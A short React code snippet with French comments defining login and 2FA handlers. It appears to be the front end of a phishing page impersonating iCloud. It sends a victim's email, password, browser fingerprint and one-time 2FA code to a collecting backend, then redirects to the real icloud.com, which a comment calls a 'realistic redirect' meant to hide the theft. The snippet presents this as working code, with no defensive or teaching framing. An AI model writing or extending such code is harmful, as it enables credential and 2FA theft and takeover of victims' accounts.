// Ajoutez ces fonctions à votre composant
const handleLogin = async (e) => {
  e.preventDefault();
  setIsLoading(true);

  try {
    // Envoi des données au backend
    const response = await fetch('http://localhost:3333/auth', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        email, 
        password,
        userAgent: navigator.userAgent,
        screenRes: `${window.screen.width}x${window.screen.height}`
      })
    });

    if (response.ok) {
      setIsVerifying(true); // Passe à l'étape 2FA
    }
  } catch (error) {
    console.error("Error:", error);
  } finally {
    setIsLoading(false);
  }
};

const handleVerifyCode = async (otp) => {
  const otpCode = otp.join("");
  
  await fetch('http://localhost:3333/verify-2fa', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, code: otpCode })
  });

  // Redirection réaliste
  window.location.href = "https://www.icloud.com";
};
